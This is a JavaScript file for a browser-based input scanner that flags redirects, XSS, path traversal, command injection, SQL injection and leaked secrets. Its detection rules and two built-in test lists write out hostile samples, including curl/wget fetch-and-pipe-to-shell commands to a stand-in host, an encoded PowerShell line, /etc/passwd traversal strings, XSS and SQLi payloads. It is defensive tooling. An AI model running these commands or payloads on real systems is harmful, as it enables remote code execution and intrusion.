// app_prod.js
(() => {
  "use strict";

  const BUILD = "prod_v1.0_RELEASE";
  const nowISO = () => new Date().toISOString();

  function $(id) { return document.getElementById(id); }

  function safeOn(el, evt, fn) {
    if (!el) return;
    el.addEventListener(evt, fn, { passive: true });
  }

  // ----------------------------
  // Normalization (v3)
  // ----------------------------
  function tryDecodeURIComponentSafe(s) {
    try { return decodeURIComponent(s); } catch { return s; }
  }

  function decodeMulti(s, rounds = 3) {
    let out = s;
    for (let i = 0; i < rounds; i++) {
      const next = tryDecodeURIComponentSafe(out);
      if (next === out) break;
      out = next;
    }
    return out;
  }

  function normalizeLine(raw) {
    let s = (raw ?? "").toString();

    // Trim + normalize whitespace
    s = s.replace(/\r/g, "").trim().replace(/\s+/g, " ");

    // Decode percent-encoding multiple times (handles ..%252f..%252f etc.)
    s = decodeMulti(s, 3);

    // Compress backslashes (Windows paths)
    s = s.replace(/\\+/g, "\\");

    return s;
  }

  function parseInputLines(txt) {
    return (txt || "")
      .split(/\r?\n/)
      .map(normalizeLine)
      .filter(Boolean);
  }

  // ----------------------------
  // Utilities
  // ----------------------------
  function shannonEntropy(str) {
    if (!str) return 0;
    const freq = new Map();
    for (const ch of str) freq.set(ch, (freq.get(ch) || 0) + 1);
    const len = str.length;
    let ent = 0;
    for (const [, c] of freq) {
      const p = c / len;
      ent -= p * Math.log2(p);
    }
    return Math.round(ent * 100) / 100;
  }

  function looksLikeURL(s) {
    return /^https?:\/\//i.test(s) || /^[a-z0-9.-]+\.[a-z]{2,}(\/|$)/i.test(s);
  }

  function classifyType(s) {
    const x = (s || "").trim();
    if (!x) return "Data";

    const isURL = looksLikeURL(x) || /(^|[?&])(url|next|returnurl|redirect_uri)=/i.test(x);

    const isExploit =
      /<script|onerror=|onload=|javascript:|data:text\/html|(\.\.\/){2,}|\\windows\\system32|union\s+select|1=1|--\s*$|wget\s+http|curl\s+-s|powershell\s+-enc/i.test(x);

    if (isExploit) return "Exploit";
    if (isURL) return "URL";
    return "Data";
  }

  // ----------------------------
  // Rules (Detection)
  // ----------------------------
  const RULES = [
    // Redirect/open-redirect
    {
      label: "REDIRECT_PARAM",
      test: s =>
        /(^|[?&])(redirect_uri|redirect|returnurl|returnUrl|next|url)=/i.test(s) ||
        /\b(returnUrl|next)=\/\/[^ \n]+/i.test(s),
      sev: 55, conf: 90
    },
    {
      label: "AUTH_ENDPOINT",
      test: s => /(oauth\/authorize|oauth2\/authorize|\/signin\/oauth|login\.microsoftonline\.com\/common\/oauth2\/authorize)/i.test(s),
      sev: 45, conf: 80
    },

    // Obfuscation / encoding
    { label: "BASE64_DECODE", test: s => /(data:text\/html;base64,)/i.test(s), sev: 35, conf: 70 },
    {
      label: "OBFUSCATION",
      test: s =>
        /%2f|%3a|%3d|%5c|\\x[0-9a-f]{2}|\\u[0-9a-f]{4}/i.test(s) ||
        /[A-Za-z0-9+\/]{40,}={0,2}/.test(s),
      sev: 35, conf: 67
    },
    { label: "HOMOGRAPH_RISK", test: s => /\bxn--/i.test(s), sev: 60, conf: 70 },

    // XSS / JS
    {
      label: "XSS/JS_SCRIPT",
      test: s => /<script|onerror=|onload=|javascript:|data:text\/html|<img[^>]+onerror=|<svg[^>]+onload=/i.test(s),
      sev: 85, conf: 85
    },

    // LFI paths
    {
      label: "LFI:ETC_PASSWD",
      test: s =>
        /(\.\.\/){2,}etc\/passwd|etc\/passwd|windows\\system32\\drivers\\etc\\hosts|C:\\Windows\\System32\\drivers\\etc\\hosts/i.test(s),
      sev: 80, conf: 75
    },

    // Command chaining
    {
      label: "CMD:CMD_CHAIN",
      test: s => /(&&|\|\|)\s*\w+|;\s*\w+|\|\s*\w+|powershell\s+-enc/i.test(s),
      sev: 85, conf: 85
    },
    {
      label: "DOWNLOAD_TOOL",
      test: s => /\b(wget|curl)\b.*\b(http|https):\/\/.*(\|\s*(sh|bash)|-O-|\|\s*sh)/i.test(s),
      sev: 90, conf: 90
    },

    // SQLi
    {
      label: "SQL:SQLI_TAUTOLOGY",
      test: s => /(1\s*=\s*1(\s*or\s*1\s*=\s*1)?|'\s*or\s*'1'\s*=\s*'1|admin'\s*--|select\s+\*\s+from\s+\w+\s+where)/i.test(s),
      sev: 75, conf: 85
    },
    { label: "SQL:SQLI_UNION_ALL", test: s => /union\s+select/i.test(s), sev: 80, conf: 80 },

    // Secrets
    {
      label: "SECRET:BEARER_TOKEN",
      test: s =>
        /\bAuthorization:\s*Bearer\s+[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+\b/i.test(s) ||
        /\bBearer\s+[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+\b/i.test(s),
      sev: 65, conf: 85
    },
    { label: "SECRET:AWS_ACCESS_KEY", test: s => /\bAKIA[0-9A-Z]{16}\b/.test(s), sev: 70, conf: 90 },
    {
      label: "SECRET:PRIVATE_KEY_BLOCK",
      test: s =>
        /-----BEGIN (RSA |EC |OPENSSH )?PRIVATE KEY-----/i.test(s) ||
        /-----END (RSA |EC |OPENSSH )?PRIVATE KEY-----/i.test(s),
      sev: 75, conf: 95
    }
  ];

  function detectHits(input) {
    const s = (input || "").trim();
    const hits = [];
    for (const r of RULES) {
      if (r.test(s)) hits.push({ label: r.label, sev: r.sev, conf: r.conf });
    }
    return hits;
  }

  // ----------------------------
  // Production Policy (strict + safe)
  // ----------------------------
  const PROD_POLICY = Object.freeze({
    name: "PROD",
    blockSev: 85,       // aligns with XSS/JS 85 and download 90
    warnSev: 55,        // redirects become WARN
    secretsForceWarn: true
  });

  function isSecretLabel(label) { return label.startsWith("SECRET:"); }

  function decideFromHits(hits, policy) {
    let severity = 0, confidence = 0;
    if (hits.length) {
      severity = Math.max(...hits.map(h => h.sev));
      confidence = Math.max(...hits.map(h => h.conf));
    }

    let decision = "ALLOW";

    const hasOnlySecrets = hits.length > 0 && hits.every(h => isSecretLabel(h.label));
    const hasAnySecret = hits.some(h => isSecretLabel(h.label));

    const hardBlock =
      hits.some(h => h.label === "DOWNLOAD_TOOL") ||
      hits.some(h => h.label === "XSS/JS_SCRIPT");

    if (hardBlock || hits.some(h => h.sev >= policy.blockSev)) decision = "BLOCK";
    else if (hits.some(h => h.sev >= policy.warnSev)) decision = "WARN";

    // Secrets clamp to WARN unless it's a hardBlock scenario
    if (policy.secretsForceWarn && (hasOnlySecrets || (hasAnySecret && decision === "BLOCK" && !hardBlock))) {
      decision = "WARN";
    }

    return { decision, severity, confidence };
  }

  function analyzeOne(input) {
    const s = (input || "").trim();
    const hits = detectHits(s);
    const { decision, severity, confidence } = decideFromHits(hits, PROD_POLICY);
    return {
      input: s,
      type: classifyType(s),
      decision,
      severity,
      confidence,
      entropy: shannonEntropy(s),
      hits
    };
  }

  function verdictFrom(rows) {
    const counts = { scans: rows.length, allow: 0, warn: 0, block: 0 };
    for (const r of rows) {
      if (r.decision === "ALLOW") counts.allow++;
      else if (r.decision === "WARN") counts.warn++;
      else counts.block++;
    }

    const peakSeverity = rows.length ? Math.max(...rows.map(r => r.severity)) : 0;
    const confidence = rows.length ? Math.max(...rows.map(r => r.confidence)) : 0;

    let verdict = "SECURE";
    if (counts.block > 0) verdict = "DANGER";
    else if (counts.warn > 0) verdict = "SUSPICIOUS";

    const sigMap = new Map();
    for (const r of rows) for (const h of r.hits) sigMap.set(h.label, (sigMap.get(h.label) || 0) + 1);

    const signals = [...sigMap.entries()]
      .sort((a, b) => b[1] - a[1])
      .map(([label, count]) => ({ label, count }));

    return { verdict, peakSeverity, confidence, counts, signals };
  }

  function buildReport(rows) {
    const meta = verdictFrom(rows);
    return {
      generatedAt: nowISO(),
      build: BUILD,
      policy: PROD_POLICY.name,
      verdict: meta.verdict,
      peakSeverity: meta.peakSeverity,
      confidence: meta.confidence,
      counts: meta.counts,
      signals: meta.signals,
      rows
    };
  }

  // ----------------------------
  // UI wiring (matches your final index.html)
  // ----------------------------
  function setVerdictUI(meta) {
    const verdictText = $("verdictText");
    const box = $("verdictBox");

    if (verdictText) verdictText.textContent = meta.verdict;

    if (box) {
      // Keep border feedback
      box.style.borderColor =
        meta.verdict === "DANGER" ? "rgba(239,68,68,.35)" :
        meta.verdict === "SUSPICIOUS" ? "rgba(245,158,11,.35)" :
        "rgba(45,212,191,.25)";

      // Toggle CSS state classes (your HTML starts with verdict-secure)
      box.classList.remove("verdict-secure", "verdict-warn", "verdict-danger");
      if (meta.verdict === "DANGER") box.classList.add("verdict-danger");
      else if (meta.verdict === "SUSPICIOUS") box.classList.add("verdict-warn");
      else box.classList.add("verdict-secure");
    }

    const peakSev = $("peakSev");
    const peakConf = $("peakConf");
    if (peakSev) peakSev.textContent = `${meta.peakSeverity}%`;
    if (peakConf) peakConf.textContent = `${meta.confidence}%`;

    const kScans = $("kScans"), kAllow = $("kAllow"), kWarn = $("kWarn"), kBlock = $("kBlock");
    if (kScans) kScans.textContent = String(meta.counts.scans);
    if (kAllow) kAllow.textContent = String(meta.counts.allow);
    if (kWarn) kWarn.textContent = String(meta.counts.warn);
    if (kBlock) kBlock.textContent = String(meta.counts.block);

    const reco = $("reco");
    if (reco) {
      if (meta.verdict === "DANGER") {
        reco.textContent = "Remediation: Block these inputs in the pipeline. Do NOT open. Verify domain ownership. Escalate with JSON report.";
      } else if (meta.verdict === "SUSPICIOUS") {
        reco.textContent = "Remediation: Review suspicious entries. Verify domains. Sanitize/encode. Escalate if needed.";
      } else {
        reco.textContent = "No high-severity patterns detected.";
      }
    }

    const sigWrap = $("signals");
    if (sigWrap) {
      sigWrap.innerHTML = "";
      if (!meta.signals.length) {
        const d = document.createElement("div");
        d.className = "sig";
        d.textContent = "No active signals";
        sigWrap.appendChild(d);
        return;
      }
      for (const s of meta.signals) {
        const d = document.createElement("div");
        d.className = "sig";
        d.textContent = `${s.label} ×${s.count}`;
        sigWrap.appendChild(d);
      }
    }
  }

  function renderRows(rows) {
    const body = $("rowsBody");
    if (!body) return;

    body.innerHTML = "";

    if (!rows.length) {
      const tr = document.createElement("tr");
      tr.className = "empty";
      const td = document.createElement("td");
      td.colSpan = 6;
      td.textContent = "No results yet.";
      tr.appendChild(td);
      body.appendChild(tr);
      return;
    }

    for (const r of rows) {
      const tr = document.createElement("tr");

      const tdInput = document.createElement("td");
      tdInput.textContent = r.input;

      const tdType = document.createElement("td");
      tdType.textContent = r.type;

      const tdDecision = document.createElement("td");
      tdDecision.textContent = r.decision;

      const tdSev = document.createElement("td");
      tdSev.textContent = `${r.severity}%`;

      const tdConf = document.createElement("td");
      tdConf.textContent = `${r.confidence}%`;

      const tdEnt = document.createElement("td");
      tdEnt.textContent = String(r.entropy);

      tr.append(tdInput, tdType, tdDecision, tdSev, tdConf, tdEnt);
      body.appendChild(tr);
    }
  }

  // ----------------------------
  // Actions
  // ----------------------------
  const TEST_A = [
    "hello world",
    "https://example.com/",
    "https://accounts.google.com/signin/oauth/authorize?redirect_uri=https://evil.com",
    "https://login.microsoftonline.com/common/oauth2/authorize?redirect_uri=https://evl1.com",
    "http://xn--pple-43d.com/login",
    "http://paypaI.com/security",
    "http://micros0ft.com/account/verify",
    "https://good.com/redirect?url=https://evil.com",
    "https://good.com/redirect?next=https%3A%2F%2Fevil.com",
    "redirect_uri=https://evil.com",
    "returnUrl=//evil.com",
    "next=//evil.com",
    "url=javascript:alert(1)",
    "<svg onload=alert(1)>",
    "\"><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert(1)",
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    "../../../../etc/passwd",
    "..%252f..%252f..%252f..%252fetc%252fpasswd",
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
    "; ls -la",
    "| whoami",
    "&& curl http://evl1.tld/payload.sh | sh",
    "powershell -enc SQBFAFgA",
    "SELECT * FROM users WHERE 1=1 OR 1=1",
    "' OR '1'='1",
    "admin'--",
    "UNION SELECT username,password FROM users",
    "{\"token\":\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.fake.payload\"}",
    "Authorization: Bearer abc.def.ghi",
    "AKIAIOSFODNN7EXAMPLE",
    "-----BEGIN PRIVATE KEY-----",
    "MIIEvQIBADANBgkqhkiG9w0BAQEFAASC...",
    "-----END PRIVATE KEY-----",
    "{\"op\":\"add\",\"path\":\"/admin\",\"value\":true}",
    "wget http://evl1.tld/a.sh -O- | sh",
    "curl -s http://evl1.tld/a | bash",
    "<script src=https://static.cloudflareinsights.com/beacon.min.js></script>"
  ];

  const TEST_B = [
    "hello world",
    "https://example.com/",
    "https://good.com/redirect?next=https%3A%2F%2Fevil.com",
    "returnUrl=//evil.com",
    "url=javascript:alert(1)",
    "<img src=x onerror=alert(1)>",
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    "../../../../etc/passwd",
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
    "&& curl http://evl1.tld/payload.sh | sh",
    "UNION SELECT username,password FROM users",
    "powershell -enc SQBFAFgA"
  ];

  let lastReport = null;

  function runScanFromTextarea() {
    const inputEl = $("input");
    if (!inputEl) return;

    const lines = parseInputLines(inputEl.value);
    const rows = lines.map(analyzeOne);
    const report = buildReport(rows);

    lastReport = report;

    setVerdictUI({
      verdict: report.verdict,
      peakSeverity: report.peakSeverity,
      confidence: report.confidence,
      counts: report.counts,
      signals: report.signals
    });

    renderRows(report.rows);
  }

  function exportJSON() {
    if (!lastReport) runScanFromTextarea();
    if (!lastReport) return;

    const blob = new Blob([JSON.stringify(lastReport, null, 2)], { type: "application/json" });
    const a = document.createElement("a");
    const ts = new Date().toISOString().replace(/[:.]/g, "-");
    a.download = `validoon_report_${ts}.json`;
    a.href = URL.createObjectURL(blob);
    document.body.appendChild(a);
    a.click();
    setTimeout(() => {
      URL.revokeObjectURL(a.href);
      a.remove();
    }, 0);
  }

  function clearAll() {
    const inputEl = $("input");
    if (inputEl) inputEl.value = "";
    lastReport = null;

    setVerdictUI({
      verdict: "SECURE",
      peakSeverity: 0,
      confidence: 0,
      counts: { scans: 0, allow: 0, warn: 0, block: 0 },
      signals: []
    });

    renderRows([]);
  }

  function loadTest(lines) {
    const inputEl = $("input");
    if (!inputEl) return;
    inputEl.value = lines.join("\n");
    runScanFromTextarea();
  }

  // Modal matches your HTML: <div id="infoDlg" class="modal-backdrop hidden">
  function openInfo() {
    const dlg = $("infoDlg");
    if (!dlg) return;
    dlg.classList.remove("hidden");
    dlg.setAttribute("aria-hidden", "false");
  }

  function closeInfo() {
    const dlg = $("infoDlg");
    if (!dlg) return;
    dlg.classList.add("hidden");
    dlg.setAttribute("aria-hidden", "true");
  }

  function boot() {
    const stamp = $("buildStamp");
    if (stamp) stamp.textContent = `Build: ${BUILD}`;

    setVerdictUI({
      verdict: "SECURE",
      peakSeverity: 0,
      confidence: 0,
      counts: { scans: 0, allow: 0, warn: 0, block: 0 },
      signals: []
    });

    safeOn($("btnLoadA"), "click", () => loadTest(TEST_A));
    safeOn($("btnLoadB"), "click", () => loadTest(TEST_B));
    safeOn($("btnScan"), "click", runScanFromTextarea);
    safeOn($("btnExport"), "click", exportJSON);
    safeOn($("btnClear"), "click", clearAll);
    safeOn($("btnInfo"), "click", openInfo);
    safeOn($("btnCloseInfo"), "click", closeInfo);

    // Close modal on backdrop click
    const dlg = $("infoDlg");
    if (dlg) {
      dlg.addEventListener("click", (e) => {
        if (e.target === dlg) closeInfo();
      }, { passive: true });
    }

    console.log(`[Validoon] ${BUILD} loaded. Mode=PROD. Local-only. No network.`);
  }

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", boot, { passive: true });
  } else {
    boot();
  }
})();